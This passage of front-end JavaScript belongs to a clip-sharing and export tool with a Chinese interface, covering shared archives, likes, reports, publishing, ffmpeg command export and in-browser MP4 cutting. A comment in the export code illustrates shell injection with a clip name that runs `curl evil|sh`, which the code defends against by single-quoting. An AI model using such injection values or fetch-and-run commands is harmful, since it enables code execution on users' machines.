  el.sharedList.replaceChildren(...nodes);
}
// A published 归档: header collapsed by default, expand to pick a clip.
function renderSharedSet(entry) {
  const set = entry.set || {}, clips = entry.clips || [];
  const wrap = document.createElement('div'); wrap.className = 'archive-set';
  if (openSharedSets.has(set.id)) wrap.classList.add('open');

  const head = document.createElement('div'); head.className = 'archive-set-head';
  const arrow = document.createElement('span'); arrow.className = 'arrow'; arrow.textContent = '▶';
  const nm = document.createElement('span'); nm.className = 'archive-set-name'; nm.textContent = set.name || '未命名归档';
  const meta = document.createElement('span'); meta.className = 'archive-set-meta';
  // like_count is the sum over member clips — there are no set-level likes.
  meta.textContent = (set.nickname || '匿名') + ' · ' + (set.clip_count || clips.length) + ' 个片段 · ❤️ ' + (set.like_count || 0);

  const acts = document.createElement('div'); acts.className = 'clip-card-actions';
  acts.append(
    mkBtn('📥', '全部载入暂存区', () => loadSharedSetToStaging(set, clips)),
    mkBtn('⬇', '导出全部片段命令', () => showExportSet({ name: set.name, clips: clips.map(sharedToLocal) })),
  );
  if (identity && set.identity === identity.id) {
    const del = mkBtn('🗑', '删除此归档及其片段', () => deleteOwnSharedSet(set.id)); del.style.color = '#C0392B';
    acts.append(del);
    const own = document.createElement('span'); own.className = 'badge badge-own'; own.textContent = '我的'; head.appendChild(own);
  }
  acts.addEventListener('click', e => e.stopPropagation());
  head.append(arrow, nm, meta, acts);

  const desc = document.createElement('div'); desc.className = 'archive-set-desc';
  desc.textContent = set.description || '';
  const body = document.createElement('div'); body.className = 'archive-set-body';
  if (!clips.length) body.innerHTML = '<div class="empty-hint">此归档没有公开片段。</div>';
  else body.replaceChildren(...clips.map(renderSharedClip));

  const sync = () => {
    const open = openSharedSets.has(set.id);
    body.hidden = !open; desc.hidden = !open || !set.description;
  };
  sync();
  head.addEventListener('click', () => {
    if (openSharedSets.has(set.id)) openSharedSets.delete(set.id); else openSharedSets.add(set.id);
    wrap.classList.toggle('open'); sync();
  });

  wrap.append(head, desc, body); return wrap;
}
// Server clips use snake_case; the local staging/archive shape is camelCase.
function sharedToLocal(c) {
  return { id: newId('s'), name: c.name || '未命名', description: c.description || '',
           startTime: c.start_time, endTime: c.end_time };
}
function loadSharedSetToStaging(set, clips) {
  if (!clips.length) return;
  if (staging.length > 0 && !confirm('暂存区有 ' + staging.length + ' 个未归档的片段，载入《' + (set.name||'未命名') + '》的 ' + clips.length + ' 个片段将覆盖它们。继续？')) return;
  staging = clips.map(sharedToLocal);
  // Someone else's published set is not one of your archive sets, so
  // committing it must create a new one rather than overwrite anything.
  stagingOrigin = null;
  pendingImportMeta = { name: set.name || '', description: set.description || '' };
  saveLocalData(); renderAll();
}
async function deleteOwnSharedSet(setId) {
  if (!confirm('删除这个公开归档？归档内的所有公开片段也会一并删除，此操作不可撤销。')) return;
  try {
    const resp = await fetch('/api/clip-sets/'+encodeURIComponent(setId), {method:'DELETE'});
    if (resp.ok) loadSharedClips(); else alert('删除失败。');
  } catch (_) { alert('网络错误。'); }
}
function renderSharedClip(c) {
  return (function(){
    const card = document.createElement('div'); card.className = 'clip-card';
    const nm = document.createElement('span'); nm.className = 'clip-card-name'; nm.textContent = c.name || '未命名'; nm.title = c.name || '';
    const tm = document.createElement('span'); tm.className = 'clip-card-time'; tm.textContent = formatTime(c.start_time) + ' – ' + formatTime(c.end_time);
    const meta = document.createElement('span'); meta.className = 'shared-meta'; meta.textContent = (c.nickname || '匿名') + ' · ❤️ ' + (c.like_count || 0);
    if (c.is_featured) { const b = document.createElement('span'); b.className = 'badge badge-featured'; b.textContent = '精选'; card.appendChild(b); }
    const acts = document.createElement('div'); acts.className = 'clip-card-actions';
    const loadBtn = mkBtn('📥', '加载到工作区', () => setWorkspace(c.start_time, c.end_time));
    const likeBtn = mkBtn(c.liked ? '💖' : '🤍', c.liked ? '取消赞' : '赞', function(){ toggleLike(c, this); });
    const dlBtn = mkBtn('⬇', '导出', () => showExport(c));
    const rptBtn = mkBtn('🚩', '举报', () => reportClip(c.id));
    if (identity && c.identity === identity.id) {
      const hideBtn = mkBtn('🔒', '取消公开（转为私密）', () => unpublishClip(c.id));
      const delBtn = mkBtn('🗑', '删除', () => deleteOwnSharedClip(c.id)); delBtn.style.color = '#C0392B';
      acts.append(loadBtn, likeBtn, dlBtn, rptBtn, hideBtn, delBtn);
      const own = document.createElement('span'); own.className = 'badge badge-own'; own.textContent = '我的'; card.appendChild(own);
    } else { acts.append(loadBtn, likeBtn, dlBtn, rptBtn); }
    card.append(nm, tm, meta, acts);
    const desc = mkDesc(c.description);
    if (desc) card.append(desc);
    return card;
  })();
}
function mkBtn(text, title, handler) { const b = document.createElement('button'); b.textContent = text; b.title = title; b.addEventListener('click', handler); return b; }
// Returns null when there is nothing to say, so callers can `append(...)`
// it unconditionally without leaving an empty line behind.
function mkDesc(text) {
  const t = (text || '').trim();
  if (!t) return null;
  const d = document.createElement('span');
  d.className = 'clip-card-desc';
  d.textContent = t;
  d.title = t;   // the clamp hides the tail; the tooltip still has all of it
  return d;
}

// `c.liked` comes from the server (it knows the caller's identity), so the
// direction is decided up front. Probing with a DELETE and retrying on 404
// never worked: unlike always answers 200, so the POST branch was dead.
async function toggleLike(c, btn) {
  if (!ensureIdentity()) return; btn.disabled = true;
  try {
    const resp = await fetch('/api/clips/'+encodeURIComponent(c.id)+'/like', { method: c.liked ? 'DELETE' : 'POST' });
    if (resp.ok) loadSharedClips();
    else if (resp.status === 401) { identity = null; ensureIdentity(); }
  } catch (_) {} finally { btn.disabled = false; }
}
async function reportClip(clipId) {
  if (!ensureIdentity()) return;
  const reason = prompt('举报原因 (选填):'); if (reason === null) return;
  try {
    const resp = await fetch('/api/clips/'+encodeURIComponent(clipId)+'/report', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({reason:reason||''})});
    if (resp.ok) alert('已提交举报，管理员将审核处理。'); else alert('举报失败，请重试。');
  } catch (_) { alert('网络错误，请重试。'); }
}
// Pull a clip back out of the shared area without destroying it — the
// counterpart to 公开发布. It stays in D1 with is_public = 0.
async function unpublishClip(clipId) {
  if (!confirm('取消公开此切片？它将从共享区消失，但不会被删除。')) return;
  try {
    const resp = await fetch('/api/clips/'+encodeURIComponent(clipId), {
      method:'PATCH', headers:{'Content-Type':'application/json'}, body:JSON.stringify({is_public:false}),
    });
    if (resp.ok) loadSharedClips(); else alert('操作失败。');
  } catch (_) { alert('网络错误。'); }
}
async function deleteOwnSharedClip(clipId) {
  if (!confirm('确认删除此公开切片？')) return;
  try { const resp = await fetch('/api/clips/'+encodeURIComponent(clipId), {method:'DELETE'}); if (resp.ok) loadSharedClips(); else alert('删除失败。'); } catch (_) { alert('网络错误。'); }
}
// Publishes a whole archive set in one request. The server writes the set
// and its clips together and rolls the set back if any clip fails, so a
// half-published collection cannot appear under a name the author trusts.
async function publishSet(setId) {
  const set = findSet(setId); if (!set) return;
  const clips = set.clips || [];
  if (!clips.length) { alert('该归档没有片段。'); return; }
  if (!ensureIdentity()) return;
  if (!confirm('将归档《' + (set.name||'未命名') + '》的 ' + clips.length + ' 个片段整组公开？其他人将能看到你的昵称。')) return;
  // The server has no idempotency key, so a double-click (or an impatient
  // second click during a slow upload) would publish the same set twice.
  if (publishing.has(setId)) return;
  publishing.add(setId);
  try {
    const resp = await fetch('/api/clip-sets', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        file_path: filePath, name: set.name || '未命名归档', description: set.description || '',
        clips: clips.map(c => ({ name:c.name||'片段', description:c.description||'', start_time:c.startTime, end_time:c.endTime })),
      }),
    });
    if (resp.ok) { alert('✅ 已整组公开发布！'); loadSharedClips(); }
    else if (resp.status === 401) { identity = null; ensureIdentity(); }
    else { const e = await resp.json().catch(()=>({})); alert('发布失败: '+(e.message||'请重试')); }
  } catch (_) { alert('网络错误，请重试。'); }
  finally { publishing.delete(setId); }
}
async function publishClip(clip) {
  if (!ensureIdentity()) return;
  try {
    const resp = await fetch('/api/clips', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({file_path:filePath, name:clip.name||'片段', description:clip.description||'', start_time:clip.startTime, end_time:clip.endTime, is_public:true})});
    if (resp.ok) { alert('✅ 已公开分享！'); loadSharedClips(); }
    else { const e = await resp.json().catch(()=>({})); alert('发布失败: '+(e.message||'请重试')); }
  } catch (_) { alert('网络错误，请重试。'); }
}

// ── Export ──
// The generated line is meant to be pasted into a shell, and clip names come
// from other people's public clips. Double quotes do not contain `"` or `$`,
// so a clip named `x"; curl evil|sh; "` would run on the reader's machine.
// Single-quote everything: inside '…' the shell expands nothing, and the
// only escape needed is for a literal quote.
function shq(s) { return "'" + String(s).replace(/'/g, "'\\''") + "'"; }
function showExport(clip) {
  el.exportTitle.textContent = '⬇ 导出: ' + (clip.name || '片段');
  el.exportCmd.textContent = clipCmd(clip); el.exportModal.hidden = false;
  prepareQuickDownload([clip], clip.name || '片段');
}
function clipCmd(clip) {
  const start = clip.start_time || clip.startTime || 0;
  const duration = (clip.end_time || clip.endTime || 0) - start;
  const name = (clip.name || 'clip') + (fileIsAudio ? '.m4a' : '.mp4');
  return `ffmpeg -ss ${Number(start).toFixed(1)} -i ${shq(location.origin + '/api/file/' + encodePath(fileKey))} -t ${duration.toFixed(1)} -c copy ${shq(name)}`;
}
// A whole archive set is the natural batch: one command per clip, each a
// ranged read of the same HQ original. Still no server-side work.
function showExportSet(set) {
  const clips = set.clips || [];
  if (!clips.length) { alert('该归档没有片段。'); return; }
  el.exportTitle.textContent = '⬇ 导出归档: ' + (set.name || '未命名归档') + ' (' + clips.length + ' 个片段)';
  el.exportCmd.textContent = clips.map(clipCmd).join('\n');
  el.exportModal.hidden = false;
  prepareQuickDownload(clips, set.name || '归档');
}

// ── One-click download ──
// The cut happens in the page: mp4clip.js reads the original's index over
// Range requests, pulls only the bytes the window needs and rewrites the
// container around them. No re-encoding, and nothing for the server to do —
// it is the same `/api/file/{key}` ranged read the player already makes.
//
// Always against `fileKey`, the HQ original — never the currently selected
// preview source. Clipping is done against a proxy so it stays responsive on
// a phone; the export is the thing people keep.
let quickJob = null;      // { clips, label, plans, bytes } once probed
let quickRunning = false;

function quickNote(text, cls) {
  el.quickNote.textContent = text;
  el.quickNote.className = 'dialog-note fine' + (cls ? ' ' + cls : '');
}
function quickProgress(frac) {
  el.quickBar.hidden = frac == null;
  el.quickFill.style.width = frac == null ? '0%' : Math.round(frac * 100) + '%';
}
function clipRange(c) {
  return [c.start_time ?? c.startTime ?? 0, c.end_time ?? c.endTime ?? 0];
}

// Probing costs 2–3 small Range requests plus the moov, so it runs when the
// dialog opens rather than on page load — most visits never export. mp4clip
// caches the parsed index per URL, so a second clip from the same file is free.
async function prepareQuickDownload(clips, label) {
  quickJob = null;
  quickProgress(null);
  el.quickBtn.disabled = true;
  el.quickBtn.textContent = clips.length > 1
    ? '⬇ 一键打包下载 ' + clips.length + ' 个片段 (ZIP)'
    : '⬇ 一键下载（浏览器直接剪切）';
  if (!window.MP4Clip) { quickUnavailable('浏览器剪切不可用'); return; }
  quickNote('正在读取索引…');

  const url = '/api/file/' + encodePath(fileKey);
  const src = await MP4Clip.open(url);
  if (!src.ok) { quickUnavailable(src.reason); return; }

  const plans = [], bad = [];
  let bytes = 0, snapped = 0;
  for (const c of clips) {
    const [a, b] = clipRange(c);
    const p = MP4Clip.plan(src, a, b);
    if (!p.ok) { bad.push((c.name || '片段') + '：' + p.reason); continue; }
    plans.push({ clip: c, plan: p });
    bytes += p.bytes;
    if (p.snapped) snapped++;
  }
  if (!plans.length) { quickUnavailable(bad[0] || '无法剪切'); return; }

  quickJob = { clips, label, plans, bytes };
  el.quickBtn.disabled = false;

  const parts = ['约 ' + formatSize(bytes) + '，无需重新编码'];
  // A cut can only start on a keyframe, so say so rather than let the file
  // silently begin a second early. Same snap `ffmpeg -ss … -c copy` performs.
  if (snapped) {
    const one = plans.find(x => x.plan.snapped).plan;
    parts.push(plans.length === 1
      ? '起点对齐到最近关键帧 ' + formatTime(one.actualStart) + '（早 ' + (one.start - one.actualStart).toFixed(1) + ' 秒）'
      : snapped + ' 个片段的起点将对齐到最近关键帧');
  }
  if (bad.length) parts.push(bad.length + ' 个片段无法剪切，将被跳过');
  quickNote(parts.join(' · '), bad.length ? 'warn' : '');
  // The ffmpeg block is the fallback; when one-click works it stays folded.
  el.exportAdv.open = false;
}

// Every decline lands here: button off, reason on screen, ffmpeg block opened
// so there is always a way forward. `msg` is the reason alone — the pointer
// to ffmpeg is appended once, here, rather than by each caller.
function quickUnavailable(msg) {
  quickJob = null;
  el.quickBtn.disabled = true;
  quickNote(msg + '，请使用下面的 ffmpeg 命令。', 'bad');
  quickProgress(null);
  el.exportAdv.open = true;
}

async function runQuickDownload() {
  if (!quickJob || quickRunning) return;
  quickRunning = true;
  el.quickBtn.disabled = true;
  const label = el.quickBtn.textContent;
  const { plans, bytes } = quickJob;
  // Weight each clip's share of the bar by its size, so a 2-minute clip in a
  // batch does not advance it at the same rate as a 5-second one.
  let doneBytes = 0;
  try {
    const files = [];
    for (let i = 0; i < plans.length; i++) {
      const { clip, plan } = plans[i];
      const total = plan.fetchBytes + plan.bytes;
      el.quickBtn.textContent = plans.length > 1
        ? '正在剪切 ' + (i + 1) + '/' + plans.length + '…' : '正在剪切…';
      const blob = await MP4Clip.render(plan, {
        onProgress: ev => {
          const inner = (ev.phase === 'fetch' ? ev.loaded : plan.fetchBytes + ev.loaded) / total;
          quickProgress((doneBytes + inner * plan.bytes) / bytes);
        }
      });
      doneBytes += plan.bytes;
      quickProgress(doneBytes / bytes);
      files.push({ name: MP4Clip.safeName(clip.name || '片段', plan.ext), blob });
    }
    if (files.length === 1) {
      MP4Clip.saveBlob(files[0].blob, files[0].name);
    } else {
      el.quickBtn.textContent = '正在打包…';
      const zipBlob = await MP4Clip.zip(dedupeNames(files));
      MP4Clip.saveBlob(zipBlob, MP4Clip.safeName(quickJob.label, '.zip'));
    }
    quickNote('✅ 已保存 ' + files.length + ' 个文件（' + formatSize(bytes) + '）');
  } catch (err) {
    quickNote('剪切失败：' + (err && err.message || err) + '。请改用下面的 ffmpeg 命令。', 'bad');
    el.exportAdv.open = true;
  } finally {
    quickProgress(null);
    el.quickBtn.textContent = label;
    el.quickBtn.disabled = false;
    quickRunning = false;
  }
}

// Two clips in one archive may well share a name; a ZIP with duplicate
// entries extracts as a single overwritten file in most tools.
function dedupeNames(files) {
  const seen = new Map();
  return files.map(f => {
    const n = seen.get(f.name) || 0;
    seen.set(f.name, n + 1);
    if (!n) return f;
    const dot = f.name.lastIndexOf('.');
    return { name: f.name.slice(0, dot) + ' (' + (n + 1) + ')' + f.name.slice(dot), blob: f.blob };
  });
}
// Closing while a cut is running would leave the transfer going with no
// progress bar attached to it, so the dialog stays put until it finishes.
// Nothing is lost by waiting — the ✕ is the only thing disabled.
function closeExportModal() {
  if (quickRunning) { quickNote('正在剪切，完成后可关闭。', 'warn'); return; }
  el.exportModal.hidden = true;
  quickJob = null;
}
function copyExportCmd() {
  navigator.clipboard.writeText(el.exportCmd.textContent).then(() => {
    const btn = $('btn-copy-cmd'); btn.textContent = '✅ 已复制!'; setTimeout(() => { btn.textContent = '📋 复制命令'; }, 2000);
  }).catch(() => alert('复制失败，请手动选择并复制。'));
}
function downloadFullFile() {
  const name = filePath.split('/').pop() || 'download';
  const a = document.createElement('a'); a.href = '/api/file/'+encodePath(fileKey)+'?download=1&name='+encodeURIComponent(name); a.download = name; a.style.display = 'none';
  document.body.appendChild(a); a.click(); document.body.removeChild(a);
}

// ── Render ──
function renderAll() { renderStaging(); renderArchive(); }
function renderStaging() {
  el.stagingCount.textContent = staging.length ? '('+staging.length+')' : '';
  const origin = stagingOrigin ? findSet(stagingOrigin) : null;
  el.stagingOriginNote.hidden = !origin;
  if (origin) el.stagingOriginNote.textContent = '正在编辑归档《' + (origin.name || '未命名') + '》— 归档时将覆盖它。';
  if (!staging.length) { el.stagingList.innerHTML = '<div class="empty-hint">暂存区为空。在工作区设置时间后点击"暂存"。</div>'; return; }
  el.stagingList.replaceChildren(...staging.map(c => renderClipCard(c, 'staging')));
}
function renderArchive() {
  const clipTotal = archive.reduce((n, s) => n + (s.clips || []).length, 0);
  el.archiveCount.textContent = archive.length ? '('+archive.length+' 个归档 / '+clipTotal+' 个片段)' : '';
  if (!archive.length) { el.archiveList.innerHTML = '<div class="empty-hint">归档区为空。在暂存区点击「归档」把当前片段保存为一个命名归档。</div>'; return; }
  el.archiveList.replaceChildren(...archive.map(renderArchiveSet));
}
function renderArchiveSet(set) {
  const clips = set.clips || [];
  const wrap = document.createElement('div'); wrap.className = 'archive-set';
  if (openSets.has(set.id)) wrap.classList.add('open');

  const head = document.createElement('div'); head.className = 'archive-set-head';
  const arrow = document.createElement('span'); arrow.className = 'arrow'; arrow.textContent = '▶';
  const nm = document.createElement('span'); nm.className = 'archive-set-name'; nm.textContent = set.name || '未命名归档';
  const meta = document.createElement('span'); meta.className = 'archive-set-meta';
  meta.textContent = clips.length + ' 个片段' + (set.createdAt ? ' · ' + set.createdAt.slice(0, 10) : '');
  const acts = document.createElement('div'); acts.className = 'clip-card-actions';
  acts.append(
    mkBtn('↩', '载入暂存区编辑', () => loadSetToStaging(set.id)),
    mkBtn('✏️', '重命名归档', () => renameSet(set.id)),
    mkBtn('📝', '归档描述', () => editSetDescription(set.id)),
    mkBtn('🌐', '整组公开发布', () => publishSet(set.id)),
    mkBtn('📤', '导出此归档 YAML', () => exportSet(set.id)),
    mkBtn('⬇', '导出全部片段命令', () => showExportSet(set)),
  );
  const del = mkBtn('🗑', '删除归档', () => deleteSet(set.id)); del.style.color = '#C0392B'; acts.append(del);
  // The action buttons sit inside the clickable header, so a click on one
  // would also toggle the set open. Stop it at the container.
  acts.addEventListener('click', e => e.stopPropagation());
  head.append(arrow, nm, meta, acts);
  head.addEventListener('click', () => {
    if (openSets.has(set.id)) openSets.delete(set.id); else openSets.add(set.id);
    wrap.classList.toggle('open');
    body.hidden = !openSets.has(set.id);
    desc.hidden = !openSets.has(set.id) || !set.description;
  });

  const desc = document.createElement('div'); desc.className = 'archive-set-desc';
  desc.textContent = set.description || ''; desc.hidden = !openSets.has(set.id) || !set.description;

  const body = document.createElement('div'); body.className = 'archive-set-body';
  body.hidden = !openSets.has(set.id);
  if (!clips.length) body.innerHTML = '<div class="empty-hint">此归档没有片段。</div>';
  else body.replaceChildren(...clips.map(c => renderClipCard(c, 'archive')));

  wrap.append(head, desc, body); return wrap;
}
function renderClipCard(c, zone) {
  const card = document.createElement('div'); card.className = 'clip-card';
  const nm = document.createElement('span'); nm.className = 'clip-card-name'; nm.textContent = c.name || '未命名'; nm.title = c.name || '';
  const tm = document.createElement('span'); tm.className = 'clip-card-time'; tm.textContent = formatTime(c.startTime)+' – '+formatTime(c.endTime);
  const acts = document.createElement('div'); acts.className = 'clip-card-actions';
  acts.append(mkBtn('📥', '加载到工作区', () => setWorkspace(c.startTime, c.endTime)));
  if (zone === 'staging') {
    acts.append(
      mkBtn('✏️', '重命名', () => renameClip(c.id, staging)),
      mkBtn('📝', '描述', () => editDescription(c.id, staging)),
      mkBtn('🌐', '公开发布', () => publishClip(c)),
      mkBtn('⬇', '导出', () => showExport(c)),
    );
    const del = mkBtn('🗑', '删除', () => { deleteClip(c.id, staging); renderStaging(); }); del.style.color = '#C0392B'; acts.append(del);
  } else {
    // A committed set is frozen: editing it means loading the whole set back
    // into 暂存 (↩ on the set header). Per-clip edit/delete here would let
    // the two areas drift back into being the same thing.
    acts.append(
      mkBtn('🌐', '公开发布', () => publishClip(c)),
      mkBtn('⬇', '导出', () => showExport(c)),
    );
  }
  card.append(nm, tm, acts);
  const desc = mkDesc(c.description);
  if (desc) card.append(desc);
  return card;
}

function encodePath(key) { return key.split('/').map(encodeURIComponent).join('/'); }
init();
